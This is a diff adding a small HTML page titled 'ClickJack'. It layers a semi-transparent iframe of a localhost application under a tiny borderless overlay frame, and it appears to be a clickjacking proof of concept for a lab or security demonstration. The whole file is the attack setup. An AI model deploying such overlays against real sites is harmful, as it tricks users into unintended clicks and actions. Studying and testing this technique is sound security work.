@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>ClickJack</title>
+    </head>
+
+    <body>
+        <iframe id="bottom" src="http://localhost:8000"
+            width="1000" height="550">
+        </iframe>
+        <iframe id="top" src="http://localhost:13141/TopFrame.html"
+            width="150" height="80" seamless="seamless"
+            scrolling="no" frameborder=0>
+        </iframe>
+
+        <style type="text/css">
+            #bottom {position:absolute; top:0px; left:0px; opacity:0.8}
+            #top    {position:absolute; top:30px; left:800px; opacity:0.3}
+        </style>
+    </body>
+</html>
